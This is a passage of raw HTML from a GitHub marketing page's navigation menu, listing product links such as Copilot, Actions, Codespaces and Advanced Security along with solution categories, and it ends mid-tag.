  <div data-target="react-partial.reactRoot"><nav class="MarketingNavigation-module__nav--jA9Zq" aria-label="Global"><ul class="MarketingNavigation-module__list--r_vr2"><li><div class="NavDropdown-module__container--bmXM2 js-details-container js-header-menu-item"><button type="button" class="NavDropdown-module__button--Hq9UR js-details-target" aria-expanded="false">Platform<svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavDropdown-module__buttonIcon--SR0Ke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></button><div class="NavDropdown-module__dropdown--Ig57Y"><ul class="NavDropdown-module__list--RwSSK"><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">AI CODE CREATION</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/features/copilot" data-analytics-event="{&quot;action&quot;:&quot;github_copilot&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_copilot_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-copilot NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M23.922 16.992c-.861 1.495-5.859 5.023-11.922 5.023-6.063 0-11.061-3.528-11.922-5.023A.641.641 0 0 1 0 16.736v-2.869a.841.841 0 0 1 .053-.22c.372-.935 1.347-2.292 2.605-2.656.167-.429.414-1.055.644-1.517a10.195 10.195 0 0 1-.052-1.086c0-1.331.282-2.499 1.132-3.368.397-.406.89-.717 1.474-.952 1.399-1.136 3.392-2.093 6.122-2.093 2.731 0 4.767.957 6.166 2.093.584.235 1.077.546 1.474.952.85.869 1.132 2.037 1.132 3.368 0 .368-.014.733-.052 1.086.23.462.477 1.088.644 1.517 1.258.364 2.233 1.721 2.605 2.656a.832.832 0 0 1 .053.22v2.869a.641.641 0 0 1-.078.256ZM12.172 11h-.344a4.323 4.323 0 0 1-.355.508C10.703 12.455 9.555 13 7.965 13c-1.725 0-2.989-.359-3.782-1.259a2.005 2.005 0 0 1-.085-.104L4 11.741v6.585c1.435.779 4.514 2.179 8 2.179 3.486 0 6.565-1.4 8-2.179v-6.585l-.098-.104s-.033.045-.085.104c-.793.9-2.057 1.259-3.782 1.259-1.59 0-2.738-.545-3.508-1.492a4.323 4.323 0 0 1-.355-.508h-.016.016Zm.641-2.935c.136 1.057.403 1.913.878 2.497.442.544 1.134.938 2.344.938 1.573 0 2.292-.337 2.657-.751.384-.435.558-1.15.558-2.361 0-1.14-.243-1.847-.705-2.319-.477-.488-1.319-.862-2.824-1.025-1.487-.161-2.192.138-2.533.529-.269.307-.437.808-.438 1.578v.021c0 .265.021.562.063.893Zm-1.626 0c.042-.331.063-.628.063-.894v-.02c-.001-.77-.169-1.271-.438-1.578-.341-.391-1.046-.69-2.533-.529-1.505.163-2.347.537-2.824 1.025-.462.472-.705 1.179-.705 2.319 0 1.211.175 1.926.558 2.361.365.414 1.084.751 2.657.751 1.21 0 1.902-.394 2.344-.938.475-.584.742-1.44.878-2.497Z"></path><path d="M14.5 14.25a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Zm-5 0a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Z"></path></svg><span class="NavLink-module__title--xw3ok">GitHub Copilot</span><span class="NavLink-module__subtitle--qC15H">Write better code with AI</span></div></a></li><li><a href="https://github.com/features/spark" data-analytics-event="{&quot;action&quot;:&quot;github_spark&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_spark_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-sparkle-fill NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M11.296 1.924c.24-.656 1.168-.656 1.408 0l.717 1.958a11.25 11.25 0 0 0 6.697 6.697l1.958.717c.657.24.657 1.168 0 1.408l-1.958.717a11.25 11.25 0 0 0-6.697 6.697l-.717 1.958c-.24.657-1.168.657-1.408 0l-.717-1.958a11.25 11.25 0 0 0-6.697-6.697l-1.958-.717c-.656-.24-.656-1.168 0-1.408l1.958-.717a11.25 11.25 0 0 0 6.697-6.697l.717-1.958Z"></path></svg><span class="NavLink-module__title--xw3ok">GitHub Spark</span><span class="NavLink-module__subtitle--qC15H">Build and deploy intelligent apps</span></div></a></li><li><a href="https://github.com/features/models" data-analytics-event="{&quot;action&quot;:&quot;github_models&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_models_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-ai-model NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M19.375 8.5a3.25 3.25 0 1 1-3.163 4h-3a3.252 3.252 0 0 1-4.443 2.509L7.214 17.76a3.25 3.25 0 1 1-1.342-.674l1.672-2.957A3.238 3.238 0 0 1 6.75 12c0-.907.371-1.727.97-2.316L6.117 6.846A3.253 3.253 0 0 1 1.875 3.75a3.25 3.25 0 1 1 5.526 2.32l1.603 2.836A3.25 3.25 0 0 1 13.093 11h3.119a3.252 3.252 0 0 1 3.163-2.5ZM10 10.25a1.75 1.75 0 1 0-.001 3.499A1.75 1.75 0 0 0 10 10.25ZM5.125 2a1.75 1.75 0 1 0 0 3.5 1.75 1.75 0 0 0 0-3.5Zm12.5 9.75a1.75 1.75 0 1 0 3.5 0 1.75 1.75 0 0 0-3.5 0Zm-14.25 8.5a1.75 1.75 0 1 0 3.501-.001 1.75 1.75 0 0 0-3.501.001Z"></path></svg><span class="NavLink-module__title--xw3ok">GitHub Models</span><span class="NavLink-module__subtitle--qC15H">Manage and compare prompts</span></div></a></li><li><a href="https://github.com/mcp" data-analytics-event="{&quot;action&quot;:&quot;mcp_registry&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;mcp_registry_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-mcp NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.795 1.694a4.287 4.287 0 0 1 6.061 0 4.28 4.28 0 0 1 1.181 3.819 4.282 4.282 0 0 1 3.819 1.181 4.287 4.287 0 0 1 0 6.061l-6.793 6.793a.249.249 0 0 0 0 .353l2.617 2.618a.75.75 0 1 1-1.061 1.061l-2.617-2.618a1.75 1.75 0 0 1 0-2.475l6.793-6.793a2.785 2.785 0 1 0-3.939-3.939l-5.9 5.9a.734.734 0 0 1-.249.165.749.749 0 0 1-.812-1.225l5.9-5.901a2.785 2.785 0 1 0-3.939-3.939L2.931 10.68A.75.75 0 1 1 1.87 9.619l7.925-7.925Z"></path><path d="M12.42 4.069a.752.752 0 0 1 1.061 0 .752.752 0 0 1 0 1.061L7.33 11.28a2.788 2.788 0 0 0 0 3.94 2.788 2.788 0 0 0 3.94 0l6.15-6.151a.752.752 0 0 1 1.061 0 .752.752 0 0 1 0 1.061l-6.151 6.15a4.285 4.285 0 1 1-6.06-6.06l6.15-6.151Z"></path></svg><span class="NavLink-module__title--xw3ok">MCP Registry<sup class="NavLink-module__label--MrIhm">New</sup></span><span class="NavLink-module__subtitle--qC15H">Integrate external tools</span></div></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">DEVELOPER WORKFLOWS</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/features/actions" data-analytics-event="{&quot;action&quot;:&quot;actions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;actions_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-workflow NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 3a2 2 0 0 1 2-2h6.5a2 2 0 0 1 2 2v6.5a2 2 0 0 1-2 2H7v4.063C7 16.355 7.644 17 8.438 17H12.5v-2.5a2 2 0 0 1 2-2H21a2 2 0 0 1 2 2V21a2 2 0 0 1-2 2h-6.5a2 2 0 0 1-2-2v-2.5H8.437A2.939 2.939 0 0 1 5.5 15.562V11.5H3a2 2 0 0 1-2-2Zm2-.5a.5.5 0 0 0-.5.5v6.5a.5.5 0 0 0 .5.5h6.5a.5.5 0 0 0 .5-.5V3a.5.5 0 0 0-.5-.5ZM14.5 14a.5.5 0 0 0-.5.5V21a.5.5 0 0 0 .5.5H21a.5.5 0 0 0 .5-.5v-6.5a.5.5 0 0 0-.5-.5Z"></path></svg><span class="NavLink-module__title--xw3ok">Actions</span><span class="NavLink-module__subtitle--qC15H">Automate any workflow</span></div></a></li><li><a href="https://github.com/features/codespaces" data-analytics-event="{&quot;action&quot;:&quot;codespaces&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;codespaces_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-codespaces NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.5 3.75C3.5 2.784 4.284 2 5.25 2h13.5c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 18.75 13H5.25a1.75 1.75 0 0 1-1.75-1.75Zm-2 12c0-.966.784-1.75 1.75-1.75h17.5c.966 0 1.75.784 1.75 1.75v4a1.75 1.75 0 0 1-1.75 1.75H3.25a1.75 1.75 0 0 1-1.75-1.75ZM5.25 3.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h13.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Zm-2 12a.25.25 0 0 0-.25.25v4c0 .138.112.25.25.25h17.5a.25.25 0 0 0 .25-.25v-4a.25.25 0 0 0-.25-.25Z"></path><path d="M10 17.75a.75.75 0 0 1 .75-.75h6.5a.75.75 0 0 1 0 1.5h-6.5a.75.75 0 0 1-.75-.75Zm-4 0a.75.75 0 0 1 .75-.75h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1-.75-.75Z"></path></svg><span class="NavLink-module__title--xw3ok">Codespaces</span><span class="NavLink-module__subtitle--qC15H">Instant dev environments</span></div></a></li><li><a href="https://github.com/features/issues" data-analytics-event="{&quot;action&quot;:&quot;issues&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;issues_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-issue-opened NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M12 1c6.075 0 11 4.925 11 11s-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1ZM2.5 12a9.5 9.5 0 0 0 9.5 9.5 9.5 9.5 0 0 0 9.5-9.5A9.5 9.5 0 0 0 12 2.5 9.5 9.5 0 0 0 2.5 12Zm9.5 2a2 2 0 1 1-.001-3.999A2 2 0 0 1 12 14Z"></path></svg><span class="NavLink-module__title--xw3ok">Issues</span><span class="NavLink-module__subtitle--qC15H">Plan and track work</span></div></a></li><li><a href="https://github.com/features/code-review" data-analytics-event="{&quot;action&quot;:&quot;code_review&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;code_review_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-code NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M15.22 4.97a.75.75 0 0 1 1.06 0l6.5 6.5a.75.75 0 0 1 0 1.06l-6.5 6.5a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L21.19 12l-5.97-5.97a.75.75 0 0 1 0-1.06Zm-6.44 0a.75.75 0 0 1 0 1.06L2.81 12l5.97 5.97a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215l-6.5-6.5a.75.75 0 0 1 0-1.06l6.5-6.5a.75.75 0 0 1 1.06 0Z"></path></svg><span class="NavLink-module__title--xw3ok">Code Review</span><span class="NavLink-module__subtitle--qC15H">Manage code changes</span></div></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">APPLICATION SECURITY</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/security/advanced-security" data-analytics-event="{&quot;action&quot;:&quot;github_advanced_security&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_advanced_security_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-shield-check NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M16.53 9.78a.75.75 0 0 0-1.06-1.06L11 13.19l-1.97-1.97a.75.75 0 0 0-1.06 1.06l2.5 2.5a.75.75 0 0 0 1.06 0l5-5Z"></path><path d="m12.54.637 8.25 2.675A1.75 1.75 0 0 1 22 4.976V10c0 6.19-3.771 10.704-9.401 12.83a1.704 1.704 0 0 1-1.198 0C5.77 20.705 2 16.19 2 10V4.976c0-.758.489-1.43 1.21-1.664L11.46.637a1.748 1.748 0 0 1 1.08 0Zm-.617 1.426-8.25 2.676a.249.249 0 0 0-.173.237V10c0 5.46 3.28 9.483 8.43 11.426a.199.199 0 0 0 .14 0C17.22 19.483 20.5 15.461 20.5 10V4.976a.25.25 0 0 0-.173-.237l-8.25-2.676a.253.253 0 0 0-.154 0Z"></path></svg><span class="NavLink-module__title--xw3ok">GitHub Advanced Security</span><span class="NavLink-module__subtitle--qC15H">Find and fix vulnerabilities</span></div></a></li><li><a href="https://github.com/security/advanced-security/code-security" data-analytics-event="{&quot;action&quot;:&quot;code_security&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;code_security_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-code-square NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M10.3 8.24a.75.75 0 0 1-.04 1.06L7.352 12l2.908 2.7a.75.75 0 1 1-1.02 1.1l-3.5-3.25a.75.75 0 0 1 0-1.1l3.5-3.25a.75.75 0 0 1 1.06.04Zm3.44 1.06a.75.75 0 1 1 1.02-1.1l3.5 3.25a.75.75 0 0 1 0 1.1l-3.5 3.25a.75.75 0 1 1-1.02-1.1l2.908-2.7-2.908-2.7Z"></path><path d="M2 3.75C2 2.784 2.784 2 3.75 2h16.5c.966 0 1.75.784 1.75 1.75v16.5A1.75 1.75 0 0 1 20.25 22H3.75A1.75 1.75 0 0 1 2 20.25Zm1.75-.25a.25.25 0 0 0-.25.25v16.5c0 .138.112.25.25.25h16.5a.25.25 0 0 0 .25-.25V3.75a.25.25 0 0 0-.25-.25Z"></path></svg><span class="NavLink-module__title--xw3ok">Code security</span><span class="NavLink-module__subtitle--qC15H">Secure your code as you build</span></div></a></li><li><a href="https://github.com/security/advanced-security/secret-protection" data-analytics-event="{&quot;action&quot;:&quot;secret_protection&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;secret_protection_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-lock NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6 9V7.25C6 3.845 8.503 1 12 1s6 2.845 6 6.25V9h.5a2.5 2.5 0 0 1 2.5 2.5v8a2.5 2.5 0 0 1-2.5 2.5h-13A2.5 2.5 0 0 1 3 19.5v-8A2.5 2.5 0 0 1 5.5 9Zm-1.5 2.5v8a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-8a1 1 0 0 0-1-1h-13a1 1 0 0 0-1 1Zm3-4.25V9h9V7.25c0-2.67-1.922-4.75-4.5-4.75-2.578 0-4.5 2.08-4.5 4.75Z"></path></svg><span class="NavLink-module__title--xw3ok">Secret protection</span><span class="NavLink-module__subtitle--qC15H">Stop leaks before they start</span></div></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n NavGroup-module__hasSeparator--AJeNz"><span class="NavGroup-module__title--TdKyz">EXPLORE</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/why-github" data-analytics-event="{&quot;action&quot;:&quot;why_github&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;why_github_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Why GitHub</span></a></li><li><a href="https://docs.github.com" data-analytics-event="{&quot;action&quot;:&quot;documentation&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;documentation_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Documentation</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li><li><a href="https://github.blog" data-analytics-event="{&quot;action&quot;:&quot;blog&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;blog_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Blog</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li><li><a href="https://github.blog/changelog" data-analytics-event="{&quot;action&quot;:&quot;changelog&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;changelog_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Changelog</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li><li><a href="https://github.com/marketplace" data-analytics-event="{&quot;action&quot;:&quot;marketplace&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;marketplace_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Marketplace</span></a></li></ul></div></li></ul><div class="NavDropdown-module__trailingLinkContainer--MNB5T"><a href="https://github.com/features" data-analytics-event="{&quot;action&quot;:&quot;view_all_features&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;view_all_features_link_platform_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">View all features</span><svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavLink-module__arrowIcon--g6Lip" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></a></div></div></div></li><li><div class="NavDropdown-module__container--bmXM2 js-details-container js-header-menu-item"><button type="button" class="NavDropdown-module__button--Hq9UR js-details-target" aria-expanded="false">Solutions<svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavDropdown-module__buttonIcon--SR0Ke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></button><div class="NavDropdown-module__dropdown--Ig57Y"><ul class="NavDropdown-module__list--RwSSK"><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">BY COMPANY SIZE</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/enterprise" data-analytics-event="{&quot;action&quot;:&quot;enterprises&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;enterprises_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Enterprises</span></a></li><li><a href="https://github.com/team" data-analytics-event="{&quot;action&quot;:&quot;small_and_medium_teams&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;small_and_medium_teams_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Small and medium teams</span></a></li><li><a href="https://github.com/enterprise/startups" data-analytics-event="{&quot;action&quot;:&quot;startups&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;startups_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Startups</span></a></li><li><a href="https://github.com/solutions/industry/nonprofits" data-analytics-event="{&quot;action&quot;:&quot;nonprofits&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;nonprofits_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Nonprofits</span></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">BY USE CASE</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/solutions/use-case/app-modernization" data-analytics-event="{&quot;action&quot;:&quot;app_modernization&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;app_modernization_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">App Modernization</span></a></li><li><a href="https://github.com/solutions/use-case/devsecops" data-analytics-event="{&quot;action&quot;:&quot;devsecops&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;devsecops_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">DevSecOps</span></a></li><li><a href="https://github.com/solutions/use-case/devops" data-analytics-event="{&quot;action&quot;:&quot;devops&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;devops_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">DevOps</span></a></li><li><a href="https://github.com/solutions/use-case/ci-cd" data-analytics-event="{&quot;action&quot;:&quot;ci/cd&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;ci/cd_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">CI/CD</span></a></li><li><a href="https://github.com/solutions/use-case" data-analytics-event="{&quot;action&quot;:&quot;view_all_use_cases&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;view_all_use_cases_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">View all use cases</span><svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavLink-module__arrowIcon--g6Lip" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">BY INDUSTRY</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/solutions/industry/healthcare" data-analytics-event="{&quot;action&quot;:&quot;healthcare&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;healthcare_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Healthcare</span></a></li><li><a 